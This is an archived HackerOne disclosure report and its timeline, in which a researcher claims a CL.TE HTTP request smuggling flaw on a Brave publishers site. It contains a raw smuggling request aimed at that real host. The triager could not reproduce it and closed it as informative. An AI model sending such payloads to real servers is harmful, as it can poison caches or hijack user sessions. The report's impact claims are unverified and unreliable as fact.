---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/http-request-smuggling
  - env/web
substate: "informative"
weakness: "HTTP Request Smuggling"
enriched: true
body: true
date: 2020-06-04
submitted: 2020-05-05T11:39:58.197Z
bounty_usd: null
votes: 12
cve: []
program: "[[programs/brave|Brave Software]]"
reporter: "dracomalfoy"
source: "https://hackerone.com/reports/866382"
title: "HTTP Request Smuggling"
---
# HTTP Request Smuggling

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 12 | **Program:** Brave Software | **Disclosed:** 2020-06-04

- Report: [https://hackerone.com/reports/866382](https://hackerone.com/reports/866382)
- CWE: HTTP Request Smuggling
- Submitted: 2020-05-05T11:39:58.197Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

When malformed or abnormal HTTP requests are interpreted by one or more entities in the data flow between the user and the web server, such as a proxy or firewall, they can be interpreted inconsistently, allowing the attacker to "smuggle" a request to one device without the other device being aware of it. 

 publishers.basicattentiontoken.org is vulnerable to CL TE ( Front end server uses Content-Length , Back-end Server uses Transfer-encoding ) HTTP request smuggling attack.

## Products affected: 

Brave Website. : publishers.basicattentiontoken.org

## Steps To Reproduce:
1.  Run the burp suite turbo intruder on the following request

```
POST /publishers/registrations.json HTTP/1.1
Host: publishers.basicattentiontoken.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://publishers.basicattentiontoken.org/sign-up
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Origin: https://publishers.basicattentiontoken.org
Content-Length: 136
DNT: 1
Connection: close
Transfer-encoding: chunked

35
{"terms_of_service":true,"email":"dhfs@kdjfksd.dfks"}
00

GET /assets/muli/Muli-Bold-ecdc1a24a0a56f42da0ee128d4c2e35235ef86acfbf98aab933aeb9cc5813bed.woff2 HTTP/1.1
Host: publishers.basicattentiontoken.org
foo: x


```

2. Script for tubro Intruder is attached. Word list can be any list containing any characters.
3. Observe 200 OK response for the /publishers/registrations.json post request which is supposed to give {"message":"Unverified request"}. Please refer the attached screenshot ( Smuggle Request1.png ) whih contain the expected response. 
4. This successfully confirms vulnerability.Please refer attached screenshot ( Final Response.png ). A seprate report is attached as well.


Any suggestions or improvement in reports are welcome as this is my first report.

## Impact

It is possible to smuggle the request and disrupt the user experience. Session Hijacking, Privilege Escalation  and cache poisoning can be the impact of this vulnerability as well.
As unauthenticated testing is performed the exact impact of the vulnerability cannot be predicted.

For more information about the vulnerability please refer :
 https://cwe.mitre.org/data/definitions/444.html ;
  https://capec.mitre.org/data/definitions/33.html

## Timeline

- **Report Filed**
- **2020-05-06** @dracomalfoy: Furthermore, Using this vulnerability, Self XSS can be further exploited ad delivered to the victim, making this vulnerability critical.
- **Report Severity Updated**
- **2020-05-07** @jseidl: @dracomalfoy I tried to reproduce the issue with your Script (using the rockyou wordlist) and with the given request and wasn't able to get any `200`s.

Also tried changing `Connection` from `close` to `keep-alive` as in your screenshot and also adding the `X-CSRF-Token` header present in your screenshot too.

I've tried adding 500 `x` entries to the wordlist as your success was with this payload, also no dice.

Can you please give further/double check the PoC information?
- **Report Needs More Info**
- **Report New**
- **2020-05-08** @dracomalfoy: I had to change turbo intruder script. Adding it here
- **2020-05-11** @dracomalfoy: Hi team, 
Any updates on this?
- **2020-05-12** @jseidl: Hi @dracomalfoy sorry for the delay on getting back to you. Have been trying to reproduce in the past days with different wordlists. The behavior I'm getting is that after a few (<10) requests, Heroku's proxy bans me and gives me the "Too many requests".

We do not have any proxy ourselves in front of the app so what you might be dealing with Heroku's own proxy issues and not with our app itself.

I recommend you reaching out to Heroku's security team at https://www.heroku.com/policy/security and report this issue to them.
- **Report Informative**
- **2020-05-13** @dracomalfoy: It might a problem of 3rd party component but it impact your asset. It is exploitable and can cause impact on security. I know it is a issue which take efforts to reproduce.
Anyways, I respect your decision.
- **2020-05-14** @dracomalfoy: Am I allowed to write about this in my blog?
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
